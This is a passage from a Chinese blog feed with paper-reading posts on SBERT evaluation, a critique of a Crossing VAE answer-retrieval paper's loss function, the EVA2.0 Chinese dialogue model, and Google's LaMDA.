<p>作者使用 10 折交叉验证和跨主题评估（2 个主题用于训练，剩余一个用于评估）进行实验验证。10 折交叉验证设置中的 SBERT 的性能几乎与 BERT 相当。但是，在跨主题评估中， SBERT 的 Spearman 相关性下降了大约 7 个点的 。这可能是由于缺失主题的情况下，BERT 依然能够通过逐字符比较得到较好的结果，SBERT 只能从单一句子推断主题、主张等，这更具有挑战性。</p>
<p><img src="argument-result.png"></p>
<h3 id="维基百科章节">维基百科章节</h3>
<p>利用维基百科的章节构建三元组数据：<strong>假设文章同一部分中的句子在主题上比不同部分中的句子更接近</strong>，锚点和正例来自文章同一个部分，而负例来自同一篇文章的不同部分。作者在 180 万个训练三元组上训练 SBERT 一个 epoch，并在 222,957 个测试三元组上对其进行评估。测试三元组来自一组不同的 Wikipedia 文章。以准确率为评估指标。实验结果如下表所示。</p>
<p><img src="wikipedia-result.png"></p>
<p>可以看出，SBERT 明显优于 Dor 等人的 BiLSTM 方法。</p>
<h3 id="senteval">SentEval</h3>
<p>SentEval 是一个流行的工具包，用于评估句子嵌入的质量。 句子嵌入用作<strong>逻辑回归分类器的特征</strong>。 逻辑回归分类器在 10 折交叉验证设置中针对各种任务进行训练，并计算测试折的预测准确度。</p>
<p>尽管 SBERT 的句子嵌入的目标不是用于基于特征的迁移学习，微调是更好的方法。但是 SentEval 依然能够在不同任务上评估句子嵌入的质量。作者在 7 个 SentEval 的句子嵌入任务中比较了 SBERT 的性能：</p>
<ul>
<li>MR：电影评论情感预测</li>
<li> CR：客户产品评论的情绪预测</li>
<li> SUBJ：来自电影评论和情节句子的主题预测</li>
<li> MPQA：来自新闻专线的短语级别意见极性分类</li>
<li> SST：斯坦福情绪树库二分类</li>
<li> TREC ：来自 TREC 的细粒度问题类型分类</li>
<li> MRPC：来自平行新闻来源的微软研究院释义语料库</li>
</ul>
<p>实验结果如下表所示。可以看到 SBERT 在 5/7 的任务上取得了最优性能，带来平均两个点的性能提升。尽管这种迁移学习并非是 SBERT 的目标，SBERT 依然取得了 SOTA 的性能。SBERT 明显比 Universal Sentence Encoder 差的数据集是 TREC 数据集。 Universal Sentence Encoder 在问答数据上进行了预训练，这似乎有利于 TREC 数据集的问题类型分类任务。</p>
<p><img src="senteval-result.png"></p>
<p>另外，这里的 BERT 的 [CLS] 优于 GloVe 嵌入平均，似乎与前文得到的结论相违背。这是因为任务设置不同。对于 STS 任务，论文使用余弦相似度来估计句子嵌入之间的相似度。余弦相似性平等地对待所有维度。相比之下，SentEval 将逻辑回归分类器与句子嵌入相匹配。这使得某些维度可以对分类结果产生更高或更低的影响。</p>
<p>观察上表还可以得出结论，BERT 的平均嵌入或者 [CLS] 符号嵌入搭配余弦相似度、欧氏距离、曼哈顿距离是不可行的。对于特征迁移学习，它们产生的结果也比 InferSent 或 Universal Sentence Encoder 稍差。然而，使用 SBERT 的孪生网络 + NLI 微调的方法能够得到 SOTA 的句嵌入。</p>
<h2 id="消融实验">消融实验</h2>
<p>作者对池化策略、训练目标、拼接结果（分类目标时使用）进行了消融实验。其中，NLI 对应分类任务，STSb 对应回归任务。结果如下表所示。</p>
<p><img src="ablation.png"></p>
<p>可以看到，分类任务下，池化策略影响不大，用于分类的特征拼接结果影响很大。InferSent 和 Universal Sentence Encoder 都是使用<span class="math inline"> \((u,v,|u −v|,u ∗v)\)</span>，然而，在 SBERT 里，<span class="math inline">\(u ∗v\)</span> 的加入还会损失性能。其中，最重要的特征是逐元素差<span class="math inline"> \(|u - v|\)</span>。</p>
<p>在回归任务下，池化策略具有很大的影响：最大池化的表现比平均池化或 CLS-token 策略要差得多。</p>
<h2 id="计算效率">计算效率</h2>
<p>下表比较了不同模型在不同设备上每秒可以处理的句子嵌入。越高越好。可以看到 SBERT 在 GPU 上是最快的，相较于 InferSent 的 LSTM，这也得益于 Transformer 的并行性。</p>
<p><img src="computation-efficiency.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是非常扎实的。从非常现实的计算效率问题出发，使用简单的方法，在不同的任务上取得与 BERT 相似甚至超越 BERT 的性能。其影响力也不容小觑，时至今日已经有 2000 + 的引用。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>语义相似度</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>语义相似度</tag>
      </tags>
  </entry>
  <entry>
    <title>有错误论文 - ACL2020：交叉 VAE 用于答案检索</title>
    <url>/blog/2022/03/31/Crossing-VAE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近读了一篇想法有趣、公式有错误、复现不出来的 ACL 论文。发出来分享一下。希望大家也不要迷信 ACL 论文，读论文过程中保持独立思考。</p>
<p>《Crossing Variational Autoencoders for Answer Retrieval》提出了一种基于交叉 VAE 的答案检索方法，通过交叉 VAE 来对齐答案和问题之间的语义。论文收录于 ACL 2020 中。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>先按照正常的步骤介绍其背景和方法。</p>
<p>答案检索，即从答案候选集合中，选择最匹配问题的答案。解决该问题的一个关键因素在于，如何学习到一个好的问题 / 答案的向量表示。传统的方法使用两个编码器 / 变分自编码器（孪生网络）分别学习二者的向量表征。这种方法过于分离，无法捕捉二者之间的对齐语义。因此，本文提出了交叉变分自编码器，类似 Seq2Seq 的方法，学习二者间的语义对齐。</p>
<p><img src="structure.png"></p>
<p>如上图所示。左一为孪生编码器，分别将答案和问题进行编码，得到向量表征后再判断是否匹配。中间的孪生自编码器也类似，区别在于使用自编码器学习到性质更好的向量表征。但是他们有个共同点：<strong>答案和问题的向量表征是分开编码得到的</strong>。这意味着编码过程中只有单个问题或答案的信息（语义、句法等），而我们关心的是答案和问题是否语义对齐。因此按前一种方法训练得到的向量表征，并不能很好地满足任务的需要。右一为本文提出的孪生交叉 VAE，即在 VAE 的基础上，使用问题和答案的隐变量重构彼此，而非重构自身。从模型结构上，该模型不像 VAE 而更像 Seq2Seq。</p>
<p>举个例子，在问答中，相似的问题的答案可能相去甚远，相似的答案的问题形式可能也差别很大。下图展示了 SQuAD 数据集上的例子，同一个答案与 17 个不同的问题相对齐。只看这些问题的语义，可能差别很大。也就是<span class="math inline"> \(z_q\)</span> 是分开的，而答案却相同，即<span class="math inline"> \(z_q\)</span> 是固定的。这种情况下，希望<span class="math inline"> \(p(y|z_q,z_a)\)</span> 对这些不同的<span class="math inline"> \(z_q\)</span> 都有较好的对齐效果是比较困难的。</p>
<p><img src="SQuAD-example.png"></p>
<p>究其根本，是<strong>同一个答案与不同的问题对齐时，其语义信息侧重点各不相同。</strong>当提问词是 "how many" 是，答案侧重点为 "three"，当提问词为 "three cities" 时，答案侧重点为 "New Orleans"... 而分开编码得到的向量表征是固定的。要解决这个问题，必须要将答案和问题的编码结合起来。</p>
<p>论文的方法在 MRR 和 R@1 上分别取得了 SOTA，分别提升了 1.46% 和 3.65%。不过对比工作里的 BERT 我怀疑是未做 finetune 的，效果太差了。</p>
<h2 id="方法">方法</h2>
<h3 id="问题定义">问题定义</h3>
<p>问题集合：<span class="math inline">\(q\in \mathcal Q\)</span>，答案集合：<span class="math inline">\(a\in\mathcal A\)</span>。对齐关系三元组定义为<span class="math inline"> \((q,a,y)\)</span>，其中<span class="math inline"> \(y\)</span> 为一个二值变量，标识对齐关系。任务定义为，给定一个问题<span class="math inline"> \(q\)</span> 和一组候选答案<span class="math inline"> \(C(q)\subseteq \mathcal A\)</span>，对每个候选答案<span class="math inline"> \(a\in C(q)\)</span> 预测<span class="math inline"> \(p(y|q,a)\)</span> 的值。</p>
<h3 id="交叉vae">交叉 VAE</h3>
<p>根据条件分布<span class="math inline"> \(p(q|z_a),p(a|z_q)\)</span> 学习交叉重构，<span class="math inline">\(z_a,z_q\)</span> 为变分自编码器的连续隐变量，交叉重构定义为： <span class="math display">\[
p(q|a)=\mathbb E_{z_a\sim p(z_a|a)}[p(q|z_a)]\\
p(a|q)=\mathbb E_{z_q\sim p(z_q|q)}[p(a|z_q)]
\]</span> 问答对的匹配，即计算条件分布<span class="math inline"> \(p(y|a,q)\)</span>，等价于 <span class="math display">\[
p(y|a,q)=\mathbb E_{z_q\sim p(z_q|q),z_a\sim p(z_a|a)}[p(y|z_a,z_q)]
\]</span> 目标函数包含三部分：</p>
<p><strong>交叉重构损失</strong>，即两个交叉熵损失之和，公式如下。其中<span class="math inline"> \(E,D\)</span> 分别代表编码器、解码器。 <span class="math display">\[
\mathcal L_{cross}(\theta_E,\theta_D)=y\cdot \mathbb E_{q\sim Q}[-logp_D(q|a,E(a))]+ y\cdot\mathbb E_{a\sim A}[-logp_D(a|q,E(q))]
\]</span> <strong>KL 散度损失</strong>，两部分后先验 KL 散度之和，公式如下： <span class="math display">\[
\mathcal L_{KL}(\theta_E)=y\cdot \mathbb E_{q\sim Q}[D_{KL}((p(z_q|q)||p(z_q))]+ y\cdot \mathbb E_{a\sim A}[D_{KL}((p(z_a|a)||p(z_a))]
\]</span> <strong> 问答匹配损失</strong>，最后输出的匹配结果的交叉熵损失，公式如下。其中，<span class="math inline">\(f\)</span> 为匹配函数。 <span class="math display">\[
\mathcal L_{matching}(\phi_f)=-[y\cdot logp_{f_\phi}p(y|z_q,z_a)+(1-y)\cdot logp_{f_\phi}(1-p(y|z_q,z_a))]
\]</span> 最后，将三个损失相加，即得到了最终的目标函数，并引入超参数控制权重： <span class="math display">\[
\mathcal J=-\alpha \mathcal L_{cross}-\beta\mathcal L_{KL}+\gamma\mathcal L_{matching}
\]</span></p>
<h2 id="问题">问题</h2>
<p>细心的读者可能会发现了，你是要<strong>最小化匹配损失，最后的<span class="math inline"> \(\mathcal J\)</span> 应该也是要最小化的。那不就变成最大化 KL 和重构损失了吗？</strong>对，这就是问题所在。论文中提到是要最大化 ELBO 和最小化匹配损失，得到了最后的<span class="math inline"> \(\mathcal J\)</span>。然而事实上，<span class="math inline">\(\mathcal L_{crosss}+\mathcal L_{KL}=-ELBO\)</span>，最小化<span class="math inline"> \(\mathcal L_{crosss}+\mathcal L_{KL}\)</span> 才是在最大化 ELBO。论文作者根本没有分清楚 VAE 的 ELBO 和损失，最后闹出了这种笑话。加之论文中有将 objective 和 loss 混用且使用错误的情况。也侧面印证了这一事实。正确的损失函数应该形如： <span class="math display">\[
\mathcal J=\alpha \mathcal L_{cross}+\beta\mathcal L_{KL}+\gamma\mathcal L_{matching}
\]</span> 复现性上，我问了实验室的一个师兄，说是论文的结果是复现不出来的，论文也没有公开代码。再加上我本人看到这篇论文第一感觉的强烈违和感，将 VAE 改为 Seq2Seq 的形式，整个 VAE 的公式可能都要重新推导，只改最后的 ELBO 如何保证过程正确？CVAE 可能才是更自然的想法。</p>
<h2 id="总结">总结</h2>
<p>读到这里，这篇论文已经没有读下去的必要了。把阅读经验分享出来，希望大家读论文的时候也加以辩证，不要迷信顶会论文，尤其是不开源代码和模型的论文。</p>
<p>科研路漫，诸君共勉。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>VAE</tag>
        <tag>问答</tag>
        <tag>负面案例</tag>
      </tags>
  </entry>
  <entry>
    <title>智源 EVA2.0: 聊天机器人 EVA 加强版</title>
    <url>/blog/2022/03/24/EVA2-0/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>EVA 2.0 是智源、清华在论文《EVA2.0: Investigating Open-Domain Chinese Dialogue Systems withLarge-Scale Pre-Training》中提出的对话模型，论文于 3.17 登陆 arxiv，也就是一周前。EVA2.0 旨在探究数据质量、模型架构、训练方法、解码策略等因素的影响，而不是进一步扩张模型和数据。经过以上优化后，仅 300M 参数的 EVA 2.0 就达到了 2.8B 的 EVA 1.0 的水平。代码和模型见 <a href="https://github.com/thu-coai/EVA">thu-coai/EVA</a>。</p>
<span id="more"></span>
<h2 id="数据">数据</h2>
<p>论文提出了相关性、通顺性、娱乐性等指标用于分析数据质量，并进行数据处理。</p>
<h3 id="质量指标">质量指标</h3>
<h4 id="相关性">相关性</h4>
<p>相关性可以反映上下文和回复间的连贯性、参与度，可以通过一些直觉公式进行估计，或者训练一个 NLU 分类模型。</p>
<p>直觉来看，上下文和回复越相关，同时包含在二者中的单词越多。因此，这一部分分数定义为上下文<span class="math inline"> \(C\)</span> 和回复<span class="math inline"> \(R\)</span> 之间的单词覆盖率，具体公式为: <span class="math display">\[
S_1=\sum_{w_i\in C,w_j\in R} dist(w_i,w_j)^\tau I(w_i=w_j)
\]</span> 其中，<span class="math inline">\(dist(w_i,w_j)\)</span> 为<span class="math inline"> \(w_i\)</span> 和<span class="math inline"> \(w_j\)</span> 在对话中的轮次距离，<span class="math inline">\(\tau\)</span> 用于调整分数。</p>
<p>训练模型的方法，论文在 LCCC 数据集上训练了一个<span class="math inline"> \(BERT_{BASE}\)</span> 模型，用于判别上下文和回复是否对应，在测试集上得到了 93.0% 的准确度和 0.86 的 F1 分数。这一部分分数公式如下，也就是分类的<span class="math inline"> \(logits\)</span>。 <span class="math display">\[
S_2=logp(1|C,R)
\]</span> 很显然，神经网络的方法更健壮一些。训练过程和细节论文未提，猜测应该就是正例 + 随机构建负例进行分类吧。不过这里也有一个有趣的地方。LCCC 数据集数据集是 BERT 分类 + 规则过滤进行清洗的，BERT 是在人工标注的 10w 条数据上训练的。EVA 1.0 版本中的 WDC-Dialog 只提到了规则过滤。2.0 从 LCCC 数据集去训练分类器，相当于是逆向了 LCCC 的分类模型，省去了人工标注数据的成本。</p>
<h4 id="通顺性">通顺性</h4>
<p>论文使用 kenlm，一个统计语言模型工具，来计算每个句子的概率，对话的通顺分数是每轮次分数之和，公式如下： <span class="math display">\[
S_3=-\frac1n\sum logP(w_1^i,w_2^i,\dots,w_{|u_i|}^i)
\]</span></p>
<h4 id="娱乐性">娱乐性</h4>
<p>由于中文社交媒体上有很多娱乐明星的粉丝（点名微博了属于是），相关对话中会包含一些不想要的信息，并且这些语言习惯也和正常聊天有所差异。因此，论文计算娱乐明星在对话中的占比，计算娱乐分数。</p>
<h3 id="数据改进">数据改进</h3>
<ul>
<li><strong>数据集改进</strong>：作者发现有些数据集不适合开放域对话场景，例如京东客服对话 JDDC 数据集，使用它训练会导致说话口吻像电商客服，因此将其从 WDC-Dialog 中移除。</li>
<li><strong>回复数量改进</strong>：来自微博等社交媒体的数据集中，存在一个上下文对应相当多回复的情况。这些回复非常相似有时会严重影响性能。因此作者为每个上下文设置了最大回复数量并进行过滤。</li>
<li><strong>规则过滤</strong>：作者在 EVA 1.0 的规则上做了进一步的改进，例如将繁体字转为简体字，移除不合理的连续标点符号等。</li>
<li><strong>基于分类器的过滤</strong>：根据质量分数的加权<span class="math inline"> \(S=\alpha S_1+\beta S_2+\gamma S_3\)</span> 对样本进行过滤，去除质量分数低于阈值的样本。</li>
</ul>
<h3 id="数据扩展">数据扩展</h3>
<p>来自社交媒体的数据会夹杂很多的流行语，而它们在日常对话中并不常见，这会导致偏差。因此，作者还从公开来源收集了以下四种数据，共计 12GB。</p>
<ul>
<li>电影和电视剧的对话字幕</li>
<li>小说和故事中的对话</li>
<li>百度知道的问答对</li>
<li>已有的公开众包对话：DuConv，KdConv，DuRecDial，NaturalConv</li>
</ul>
<h3 id="数据统计信息">数据统计信息</h3>
<p>下表展示了 EVA 2.0 和 1.0 的数据集对比。可以看到 EVA 2.0 的数据集不足 1.0 版本的<span class="math inline"> \(1/3\)</span>，但显著提升了质量。相关性、通顺性的提升与数据调整中的过滤方式大致有个对应关系，例如规则过滤主要改善通顺性。另外，个人感觉数据调整中会根据质量分数过滤，再采用质量分数来评估似乎欠妥。可能再各自随机采样样本进行人工标注更有说服力一些。</p>
<p><img src="statistics.png"></p>
<h2 id="模型">模型</h2>
<p>模型还是 Seq2Seq 的 Transformer，不过和 EVA 1.0、t5 不一样的是，使用的是 scaled Attention，即计算 Attention 的时候除以了<span class="math inline"> \(\sqrt d\)</span>。论文主要讨论了两个模型的两个配置：层数和角色信息。</p>
<p>基于 Seq2Seq 的对话模型的编码器和解码器层数往往不是一致，解码器要比编码器更深以达到更好的生成效果。但是，更深的编码器也能提高对话上下文理解能力。因此，论文在控制参数规模情况下，尝试了不同的层数比例。</p>
<p>近期工作指出，在长对话中，预训练模型可能会混淆它们的角色，因为模型是在角色信息复杂的社交媒体数据上训练得到的。因此，需要为对话模型添加角色信息保证一致性。例如，PLATO-XL 在多角色对话中添加了角色嵌入。不过由于 WDC-Dialog 数据集角色信息的缺失（例如字幕中一般不会包含角色信息），如果要添加角色信息，只能强制将对话认定为两个角色间进行的对话。论文同时使用了角色嵌入和角色标识符并测试效果。</p>
<h3 id="预训练">预训练</h3>
<p>论文研究了两种预训练方法：从头开始预训练或者从长文档预训练的模型再进行预训练。直觉来看，在长文档上预训练的模型已经学到了一些知识。但是由于文档和对话的差异性，不清楚这对对话任务是否会起到正面作用。</p>
<h3 id="解码策略">解码策略</h3>
<p>论文在上尝试了以下几种不同的解码策略。虽然有研究在英文对话机器人上对这些策略进行了实验，论文认为解码策略是语言相关的，中文的结论可能不同。</p>
<ul>
<li><strong>贪心搜索（Greedy Search）</strong>：朴素解码，每步选概率最大的 token，公式为<span class="math inline"> \(y_t=\arg\max_{y_t} P(y_t|x;y_{&lt;t})=softmax(h_t)\)</span></li>
<li><strong> 采样（Sampling）</strong>：每步根据概率分布采样 token，公式为<span class="math inline"> \(y_t\sim P(y_t|x;y_{&lt;t})=softmax(h_t/T)\)</span>，<span class="math inline">\(T\)</span> 为温度系数，增大低概率 token 被采样的概率。</li>
<li><strong>光束搜索（Beam Search）</strong>：贪心搜索的改进，避免局部最优。同时维护多个解码序列，最终选择概率最大的序列。</li>
<li><strong>长度控制（Length Control）</strong>：朴素解码策略倾向于生成短而通用的序列，长度控制可改善这一问题，常与光束搜索搭配使用。<strong>最小长度约束方法</strong>：在解码时将 &lt;EOS&gt; 的概率置 0 直至达到最小长度要求。<strong>长度惩罚</strong>：光束搜索时对候选序列分数除以<span class="math inline"> \(l^\alpha\)</span>，其中<span class="math inline"> \(l\)</span> 为序列长度，<span class="math inline">\(alpha\)</span> 越高越偏向长序列（beam search 的 score 是<span class="math inline"> \(logp\)</span>，为负数）。</li>
<li><strong>处理重复（Handling Repetitions）</strong>：语言模型生成普遍会出现重复现象。No-Repeat-N-Gram 策略禁止生成对话历史中存在的 n-gram。</li>
</ul>
<h2 id="实验">实验</h2>
<ul>
<li><strong>自动评估指标</strong>：uni-gram F1 (F1), ROUGE-L (R-L),BLEU-4 (B-4), distinct 4-grams (D-4)</li>
<li><strong> 人工评估指标</strong>：合理性、特异性、一致性</li>
</ul>
<h3 id="层数">层数</h3>
<p>6-18 代表编码器 6 层，解码器 18 层。表格可以看出，层数平衡的架构是最优的。</p>
<p><img src="layer.png"></p>
<h3 id="角色信息">角色信息</h3>
<p>还是上面的表格，加入角色信息后性能有所下降。作者解释为由于数据集中角色信息的缺失，强迫模型将多角色对话认作两个角色间进行的对话反而会带来反面效果。</p>
<h3 id="预训练策略">预训练策略</h3>
<p>下两表为两种训练策略的自动和人工评估结果。可以看出，在文档预训练的模型继续训练的模型只在知识指标上效果更优，在对话指标上都不如从头训练模型。</p>
<p><img src="pretraining-auto.png"></p>
<p><img src="pretraining-human.png"></p>
<h3 id="解码策略-1">解码策略</h3>
<p>下两表为解码策略的自动和人工评估结果。贪婪搜索默认与 no-repeat-n-gram 结合起来，因为简单的贪婪搜索通常会导致重复。</p>
<p>结论：</p>
<ul>
<li>没有在所有指标上最优的解码策略</li>
<li>采样能够生成多样的回复，但会损失合理性</li>
<li>无重复 n-gram 的简单贪心解码在人类评估中产生了令人惊讶的良好性能</li>
<li>模型在最小长度约束下倾向于生成自相矛盾的响应（与英文不同）</li>
<li>光束搜索结合采样、长度惩罚、禁止重复取得了相对均衡的性能</li>
</ul>
<p><img src="decode-auto.png"></p>
<p><img src="decode-human.png"></p>
<h3 id="最终评估">最终评估</h3>
<p>论文将 EVA 2.0 和 1.0、CPM 进行了对比。结果如下两表。baseline 还是有点少。</p>
<p><img src="evaluation.png"></p>
<h2 id="举个栗子">举个栗子</h2>
<p>下面举几个栗子来具体展示一下。可以看到，EVA 2.0 虽然有时能取得较好的对话效果，但还是会有不一致、幻觉、不安全、缺少同理心这些问题。这正是谷歌 LaMDA 想要解决的问题，可以参考我的另一篇博客<a href="https://tqnwhz.github.io/blog/2022/03/19/LaMDA/#more">谷歌 LaMDA：高达 137B 参数的 “全能型” 聊天机器人</a>。</p>
<h3 id="好">好</h3>
<p><img src="nice-example.png"></p>
<h3 id="不一致">不一致</h3>
<p><img src="inconsistent-example.png"></p>
<h3 id="幻觉">幻觉</h3>
<p><img src="hallucination.png"></p>
<h3 id="不安全">不安全</h3>
<p><img src="unsafe-example.png"></p>
<h3 id="缺少同理心">缺少同理心</h3>
<p><img src="lack-empathy.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是蛮有价值的，讨论了模型规模和数据规模之外，影响模型性能的因素。类似 RoBERTa 之于 BERT，可以作为炼丹的参考。不过读完之后我最关心的几个问题还是没有解决：</p>
<ul>
<li>模型架构上，PLATO 采用的 unified Transformer 和 EVA 的 Seq2Seq，孰优孰劣？虽然有论文做过实验，但是其模型规模、数据规模都达不到预训练模型的水平。</li>
<li>基线对比上，还是没有跟 PLATO-XL 进行比较。虽然感觉 EVA 2.0 大概率是比不过 PLATO-XL 的，但还是想了解一下差距、可能的解释、改进等。</li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>自然语言处理</tag>
        <tag>对话生成</tag>
        <tag>Transformer</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌 LaMDA：高达 137B 参数的 “全能型” 聊天机器人</title>
    <url>/blog/2022/03/19/LaMDA/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《LaMDA: Language Models for Dialog Applications》是谷歌于 2022 年发表的论文，收录在 arxiv 中。论文提出了一个名为 LaMDA（<strong>La</strong>nguage <strong>M</strong>odels for <strong>D</strong>ialog <strong>A</strong>pplication）的对话模型，拥有 137B 参数，在 1.56T 公开对话数据和网页上预训练。实验证明，虽然模型扩展能够提升对话质量，但是在安全性和事实性方面的改进很小。而监督数据上的微调能够帮助模型利用外部知识源进行回复，显著改进了安全性和事实性两个指标。</p>
<span id="more"></span>
<p>LaMDA 构建了一个工具集（TS，Tool set），包含：信息检索系统、计算器、翻译器。通过监督数据微调，LaMDA 能够利用这些工具来回答问题，这使得模型能够根据已知知识来源做出响应，减少了幻觉现象。</p>
<h2 id="简介">简介</h2>
<p>LaMDA 使用单个 Transformer 模型来执行多项任务：它生成潜在响应，然后出于安全考虑对其进行过滤、基于外部知识源并重新排序以找到最高质量的响应。LaMDA 的参数范围从 2B 到 137B 参数，在以上指标上进行测试。结果如下图所示。左侧为质量分数，右侧为安全性和事实性分数。</p>
<p><img src="overview.png"></p>
<p>可以观察到：</p>
<ul>
<li>单独的模型缩放提高了质量，但它在安全性和接地性方面的改进远远落后于人类表现</li>
<li>结合缩放和微调在所有指标上显着提高了 LaMDA，尽管模型的性能仍然低于人类水平在安全性和接地性的水平</li>
</ul>
<h2 id="预训练">预训练</h2>
<p>预训练模型架构都差不多，关键参数如下：</p>
<ul>
<li>参数规模：137B</li>
<li> 数据集：预训练（2.97B 文档 + 1.12B 对话）</li>
<li>架构 &amp; 训练目标：Transformer-Decoder，语言模型（预测下一个 token），如下图所示</li>
<li>训练成本：1024 TPU-v3 * 57.7 天</li>
</ul>
<p><img src="pretraining.png"></p>
<h2 id="评价指标">评价指标</h2>
<h3 id="ssi">SSI</h3>
<p><strong>SSI</strong> 是合理性、特异性、趣味性三项指标（Sensibleness, Specificity, Interestingnes）的平均值，是谷歌在 Menna 中提出的 SSA（合理性、特异性两项平均）的改进。各项指标具体含义如下：</p>
<ul>
<li><strong>合理性</strong>：衡量模型的回复在上下文和不要与前面所说的任何内容相矛盾。然而，通用和无聊的回复，例如 “我不知道” 的合理性分数可能很高。因此只有这一项指标是远远不够的。</li>
<li><strong>特异性</strong>：衡量模型的回复是否特定于上下文。例如，如果用户说 “我爱欧洲电视网”，而模型回答 “我也是”，那么它的特异性得分为 0。因为这种句式适用于很多上下文。</li>
<li><strong>趣味性</strong>：衡量模型的回复是否有趣。例如，对 “我如何扔球？” 的回应可能是 “你可以先捡起然后扔球来扔球”，这是有道理的，并且是针对问题的。另一个更深层次和更令人满意的答案可能是 “扔球的一种方法是用双手牢牢握住它，然后再向下摆动你的手臂，伸展你的肘部，然后向上释放球”。</li>
</ul>
<p>每项指标对应一个 0/1 标签，正例为 1，负例为 0，算术平均后就是 SSI 的值。</p>
<h3 id="角色特定指标">角色特定指标</h3>
<p><strong>有用性</strong>：如果模型的响应包含基于用户使用信息检索系统进行的独立研究的正确信息，并且用户认为它们有帮助，则它们被标记为有用。<strong>有用的响应是信息性响应的子集</strong>，由用户判断为正确且有用。</p>
<p><strong>角色一致性</strong>：如果模型的响应看起来像执行目标角色的代理会说的话，则它们被标记为角色一致。这个与合理性中的一致性不同，这里的一致性是指，例如让模型扮演珠穆朗玛峰，模型的回复中的语气词、设定等都要以珠穆朗玛峰为准。</p>
<h3 id="其他">其他</h3>
<p><strong>安全性</strong>是根据 Google 人工智能原则设定的，用以以避免造成伤害风险的意外结果，并避免产生或加强不公平的偏见，这个对应很多条规则，比较复杂，就略过了。</p>
<p><strong>事实性</strong>：包含外部世界声明的回复中，可由权威外部来源支持的回复的百分比。</p>
<p><strong>信息性</strong>：在所有回复中，包含已知来源支持的外部世界信息的回复所占的百分比。信息性与事实性仅在限定词上有所不同。因此，像 “这是一个好主意” 这样的回答，如果不包含任何外部世界的信息，就不会影响其事实，但会影响其信息性。</p>
<p><strong>引用准确度</strong>：引用其来源 URL 的模型回应在所有明确声称外部世界的回应中所占的百分比，不包括众所周知的事实（如 “马有四条腿”）。</p>
<h2 id="微调">微调</h2>
<h3 id="判别式生成式微调">判别式 / 生成式微调</h3>
<p>为了提高质量，谷歌团队收集了众包人员与 LaMDA 就任何主题交谈的 6400 次对话，每个对话包含 14-30 轮。对于每个模型回复，众包人员为其评估每个质量标签。如果回复不合理（合理性 = 0），不会收集特异性和趣味性标签。同样，如果回复不具体（特异性 = 0），不会收集趣味性标签。</p>
<p>LaMDA 生成回复的时候按照 <code>&lt;上下文&gt;&lt;哨兵&gt;&lt;回复&gt;</code> 的模板进行生成，按照 <code>&lt;上下文&gt;&lt;哨兵&gt;&lt;回复&gt;&lt;属性&gt;&lt;分数&gt;</code> 的模板进行判别式微调，例如 "What’s up? RESPONSE not much. SENSIBLE 1"。</p>
<p>得到众包数据后，按照上述模板进行微调。这样在生成时，就能够预测出对应属性值作为筛选的辅助信息。将生成的候选序列按照<span class="math inline"> \(3 *P(sensible) + P(specific) + P(interesting)\)</span> 进行排名，选择排名靠前的候选序列作为下一个响应。</p>
<p>可以看到，经过微调 + 生成筛选，LaMDA 的安全性和质量都有了较高提升。论文贴心地给出了两种类型的图。可以看到经过微调的 LaMDA 比仅预训练的基础模型在各项指标上都有提升，在对话质量上已经接近甚至超过了人类的水平，安全性上也十分接近人类的水平。不过事实性和信息性还有一定的差距。</p>
<p><img src="finetune-line.png"></p>
<p><img src="finetune.png"></p>
<h3 id="调用外部信息系统">调用外部信息系统</h3>
<p>为了避免幻觉，谷歌团队构建了一个工具集（Toolset，TS），包含：信息检索系统、计算器、翻译器。TS 接收一个字符串作为输入，输出一个字符串的列表。例如，计算器接收 135+7721”，返回 [“7856”]。类似地，翻译器可以接收 “hello in French” 并输出 [“Bonjour”]。信息检索系统可以接收 “Howold is Rafael Nadal?”，并输出 [“Rafael Nadal / Age / 35”]。如果一个工具无法解析输入（例如，计算器无法解析 “Rafael Nadal 几岁？”），它将返回一个空的结果列表，因此不会对最终输出列表做出贡献。</p>
<p>团队收集了 40k 监督的对话数据用于生成，9k 条 LaMDA 的生成候选数据（标记为正确 / 不正确）用于判别排名。这些数据同样是众包人员与 LaMDA 间通过交互式和静态方法收集得到。</p>
<p>微调分为两部分：</p>
<ul>
<li>根据上下文和基础模型响应，获取 TS 查询字符串。例如，Rafael Nadal 几岁？：上下文 + 基础→“TS，Rafael Nadal 的年龄”</li>
<li> 根据基础回复和 TS 返回结果，预测事实版本回复：例如，“他现在 31 岁”+“Rafael Nadal / Age / 35”。然后它预测事实版本：上下文 + 基础 + 查询 + 片段 →“用户，他现在 35 岁”。</li>
</ul>
<p>实际交互的例子如下：</p>
<p><img src="toolset.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文还是挺有意思的，这种生成式 + 判别式微调的方式还是第一次见，而且也可以辅助结果搜索。而且，少量的微调数据就可以取得非常好的效果。引用原文中的一句话：使用适量的人工注释微调数据（不到 0.001% 的预训练数据），可以在更好质量和更安全的对话模型方面取得重大进展。</p>
<p>虽然，说是少量，也有几千上万条数据，而且就论文中的标注复杂度，标注成本也是蛮高的。不过相较于预训练数据的海量数据，微调数据可以说是少的多的多了。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>对话生成</tag>
        <tag>LaMDA</tag>
      </tags>
  </entry>
  <entry>
    <title>复杂知识库问答（KBQA）中的问题迁移</title>
    <url>/blog/2022/03/13/Program-Transfer/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
